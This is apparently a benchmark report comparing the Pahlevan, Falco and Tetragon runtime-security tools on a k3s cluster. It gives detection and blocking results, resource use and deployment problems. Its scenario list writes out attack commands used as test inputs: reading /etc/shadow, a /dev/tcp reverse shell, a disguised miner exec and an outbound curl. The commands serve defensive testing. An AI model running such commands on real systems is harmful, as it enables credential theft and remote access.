# Pahlevan vs Falco vs Tetragon - measured runtime-security benchmark

> **These numbers are real and measured**, produced by `test/benchmark/run.sh`
> inside the kernel-isolated VM (`hack/vm/`) on the date below. Where something
> could not be measured or a tool could not be deployed as-is, it is stated
> explicitly. Nothing here is hand-tuned to favor any tool.

## Environment

| Item | Value |
|------|-------|
| Date (UTC) | 2026-08-14 |
| Host | QEMU/KVM VM (`hack/vm/up.sh`), headless, 4 vCPU / 3.8 GiB RAM |
| OS | Ubuntu 24.04.4 LTS |
| Kernel | 6.8.0-137-generic (x86_64) |
| Active LSMs | `lockdown,capability,landlock,yama,apparmor,bpf` (**bpf LSM active**) |
| Kubernetes | k3s v1.36.3+k3s1 |
| Container runtime | containerd v2.3.2-k3s2 |
| Helm | v3.21.4 |
| Target workload | `nginx:1.27` (Debian), Deployment `bench/target`, labels `app=target,pahlevan=protected` |

### Tool versions (exactly what was deployed)

| Tool | Version | How deployed | Driver / mode |
|------|---------|--------------|---------------|
| **Pahlevan** | image `pahlevan:bench`, built from branch `redesign/daemonset-agent-operator` (session-start tree `901486e`) **+ 2 one-line bench patches** (see "Pahlevan deployability" below) | `install.yaml` patched (image + `imagePullPolicy: Never` + agent `privileged: true` + operator `replicas: 1`), then a `PahlevanPolicy` (`learningConfig.duration: 30s`, `enforcementConfig.mode: Blocking`) | eBPF: raw tracepoint `sys_enter` + **LSM `file_open`**; per-cgroup auto-learned allow-list |
| **Falco** | 0.44.1 (Helm chart `falcosecurity/falco` 9.1.0) | `helm install`, default ruleset (stable maturity) | `driver.kind=modern_ebpf` (CO-RE) |
| **Tetragon** | v1.7.0 (Helm chart `cilium/tetragon` 1.7.0) | `helm install`, defaults | eBPF process sensor; optional `TracingPolicy` for enforcement |

Tools were run **one at a time** against the **same** target workload and the
**same** four scenarios (the VM has only 3.8 GiB RAM; running all three agents
plus k3s simultaneously is not reliable). Each tool was fully removed before the
next was installed.

## Scenarios (`test/benchmark/scenarios/`)

Attacks are injected into the target pod with `kubectl exec` (simulating an
attacker running commands inside the compromised workload):

1. **01 sensitive-file-read** - `cat /etc/shadow`
2. **02 reverse-shell** - `bash -c 'sh -i >/dev/tcp/127.0.0.1/4444 0>&1'`
3. **03 crypto-miner-exec** - `cp /bin/sleep /tmp/xmrig && /tmp/xmrig`
4. **04 unexpected-egress** - `curl http://198.51.100.10/` (TEST-NET-2, unroutable)

## Results matrix

Legend - **Detected**: the tool produced a signal for the action. **Blocked**:
the action was *prevented* (not merely alerted).

| Scenario | Pahlevan Detected | Pahlevan Blocked | Falco Detected | Falco Blocked | Tetragon Detected | Tetragon Blocked |
|----------|:-----------------:|:----------------:|:--------------:|:-------------:|:-----------------:|:----------------:|
| 01 read `/etc/shadow` | Yes (file_open) | **Yes** (EPERM) | **Yes** (Warning: sensitive file) | No (alert-only) | Yes (exec telemetry) | No by default¹ |
| 02 reverse shell | Yes (file_open on shell) | **Yes** (EPERM) | **No** (default rules) | No | Yes (exec telemetry) | No by default |
| 03 exec from `/tmp` | Yes (file_open) | **Yes** (EPERM) | **Yes** (Critical: not in base image) | No | Yes (exec telemetry, incl `/tmp/xmrig`) | No by default |
| 04 egress | No² | **Yes**³ (EPERM on `curl` exec) | **No** (default rules) | No | Yes (exec telemetry, incl dest URL) | No by default |

¹ Tetragon **can** block with a hand-written `TracingPolicy` - demonstrated
separately below (with a serious caveat).
² Pahlevan's network eBPF programs are **not attached at runtime** (see below), so
egress itself is not observed.
³ The egress *attack* is blocked only because it requires exec'ing `curl`, an
unlearned binary - **not** by inspecting the network connection. Egress initiated
by an already-allowed process would **not** be blocked.

### How the block manifests (Pahlevan)

Pahlevan's only wired enforcement is the **LSM `file_open` hook**: in enforce
mode it returns `-EPERM` for any file path not in the container's auto-learned
allow-list, keyed per cgroup. This was confirmed directly in the kernel - the
`file_mode` BPF map showed the nginx cgroup (`id 14274`) set to `1` (enforce),
and `file_allowed` held 5476 learned entries.

In practice this blocks **all four** scenarios, because each requires launching a
new process, and even the `runc exec` setup opens an unlearned path - every attack
failed with:

```
OCI runtime exec failed: ... unable to setup user:
reopen fsmount:fscontext:proc/self/setgroups: reopen fd 7: operation not permitted
```

**Control proof:** an identical pod with **no** PahlevanPolicy (cgroup absent from
`file_mode`) executed `cat /etc/shadow` successfully (`rc=0`, shadow printed) and
`exec` worked normally. So the block is attributable to Pahlevan, not to k3s/runc.

### Detection latency

| Tool | Observed latency |
|------|------------------|
| Pahlevan | Enforcement is a **synchronous in-kernel LSM decision** (the `open` returns EPERM inline); there is no separate async detection delay to measure. |
| Falco | Alert appears in stdout within ~1 s of the action (async userspace rule evaluation). |
| Tetragon | `process_exec` events stream in near-realtime (sub-second) from the kernel exporter. |

Precise sub-second latency distributions were **not** measured (no shared
high-resolution clock across action + signal in this harness).

### Agent resource use

Measured from the agent pod's cgroup v2 `memory.current` and `cpu.stat` (20 s /
15 s samples). "Under load" = a tight `curl` loop against nginx generating
syscalls on the node. Single-node cluster.

| Tool (agent) | Memory | CPU idle | CPU under load |
|--------------|-------:|---------:|---------------:|
| **Pahlevan** agent | ~327 MiB | ~0.4 % of a core (crictl: 4 mCPU) | ~10.4 % of a core |
| **Falco** | ~106 MiB | ~0.34 % | ~10.4 % |
| **Tetragon** | ~67 MiB | ~0.07 % | ~7.0 % |

Caveats:
- Pahlevan's memory is the highest, dominated by the Go runtime plus pre-allocated
  eBPF maps (`file_allowed`/`syscall_seen` LRUs). Its "under load" CPU is
  **inflated** because the deployed agent logs a line **per observed syscall** at
  DEBUG level; a non-DEBUG build would use less.
- All three raw-tracepoint/process observers pay CPU proportional to node-wide
  syscall/exec volume, hence the similar under-load figures.

### False positives / noise (benign workload)

| Tool | Observation |
|------|-------------|
| **Pahlevan** | The nginx workload kept serving **HTTP 200** before, during, and after enforcement (its served path was learned) - **no workload false positive**. However, **all `kubectl exec` is blocked** once enforcing (an operational cost), and static paths not touched during the 30 s learning window would also be blocked (only `/` was exercised). |
| **Falco** | No alerts on the benign nginx traffic. But it **flagged host `systemd-executor` reading `/etc/shadow` and `/etc/pam.d/*` as "non-trusted"** - host-level noise unrelated to the workload. |
| **Tetragon** | Default mode is observe-only → no enforcement false positives, but emits **high-volume telemetry** for every exec node-wide (k3s, runc, containerd-shim included). The enforcement test produced a catastrophic false positive - see below. |

## Tetragon enforcement (with a hand-written TracingPolicy)

To test whether Tetragon *can* block (it does not by default), a `TracingPolicy`
was applied that `Sigkill`s on `security_file_permission` for `/etc/shadow`:

- **It blocked scenario 01** - `cat /etc/shadow` was killed (`rc=137`, SIGKILL).
- **But the same (node-wide, un-scoped) policy caused an outage**: it also killed
  unrelated processes (`cat /etc/hostname`, `rc=137`) and then froze **all new
  process creation** on the node (every `exec` was SIGKILLed on file access),
  requiring an **out-of-band `system_reset` of the VM** to recover, followed by a
  race to delete the `TracingPolicy` CR before Tetragon re-attached the kprobe.

This is a genuine, reproducible finding, not a scripted result: hand-authored
enforcement policies are powerful but error-prone, and an unscoped `Sigkill`
policy can take down a node. It is the practical contrast to Pahlevan's
auto-learned allow-list (no hand-written rules) and to Falco's alert-only design.

## Pahlevan deployability (honest findings)

The committed agent on this branch **did not run as-is**; it crash-looped. Two
one-line workarounds were applied **to a throwaway build copy in scratch space
only** (the repo tree was not modified - verify with `git status`) to obtain a
running agent and measure real enforcement:

1. **Double `AttachPrograms()`** - `cmd/pahlevan-agent/main.go` calls
   `AttachPrograms()` directly *and* `Manager.Start()` calls it again
   (`pkg/ebpf/manager.go`), re-registering the `sys_enter` raw tracepoint →
   `EEXIST ("file exists")` → fatal crashloop. Workaround: drop the redundant
   direct call.
2. **Duplicate controller name** - `AttackSurfaceAnalyzerReconciler` and
   `PahlevanPolicyReconciler` both `For(&PahlevanPolicy{})`, so both default to the
   controller-runtime name `pahlevanpolicy` → "controller names must be unique" →
   fatal. Workaround: give one an explicit `.Named(...)`.

Additional operational findings (no code change needed, but they shaped the run):

3. **Learning requires the workload to (re)start under a running agent.** If the
   agent attaches after the workload is already running, it misses the workload's
   events and the cgroup never transitions to enforce. The target pod had to be
   recreated with the agent already running before the learn→enforce transition
   fired.
4. **Enforcement signals are logs + kernel state only.** `pahlevan_*` Prometheus
   metrics are **not exposed** on `:8080` (the promauto default registry is not
   the one controller-runtime serves - confirmed by `curl`), and
   `.status.enforcementStatus.blocked*` counters stay `0`. Detection/blocks were
   verified via the kernel `file_mode`/`file_allowed` BPF maps, the observed
   `EPERM`, and the control-pod comparison - not via metrics or CRD status.
5. **On agent restart** the attach race (finding 1's chokepoint) recurs and the
   agent can fall back into CrashLoopBackOff; when the agent is down, enforcement
   stops (BPF links detach).

## What could NOT be measured / limitations

- **Pahlevan network & syscall enforcement**: not exercised because they are not
  wired at runtime - the network XDP/TC/LSM programs are **not attached** and no
  syscall-deny path exists (only file-open denial is real). So scenario 04 is
  blocked incidentally (via the `curl` binary's file open), and reverse-shell /
  egress *network* primitives are neither observed nor blocked.
- **Simultaneous head-to-head**: not possible on 3.8 GiB RAM; tools were run
  sequentially against identical scenarios instead.
- **Precise detection-latency numbers**: not instrumented (see above).
- **Falco/Tetragon tuned rulesets**: only vendor **default** rules/policies were
  used. Falco's incubating rules (e.g. reverse-shell / redirect-to-network) and
  additional Tetragon `TracingPolicy`s would detect/block more; that is out of
  scope for a "defaults" comparison.

## One-line summary

With vendor defaults, **Falco** alerts on 2/4 (never blocks), **Tetragon** gives
exec telemetry on all 4 (never blocks by default; can block but a naive policy
caused a node outage), and **Pahlevan** blocks all 4 from an **auto-learned**
allow-list - but only via **file-open** denial (its network/syscall enforcement
is not wired), it is the heaviest on memory, and the committed build required two
one-line fixes to run at all.
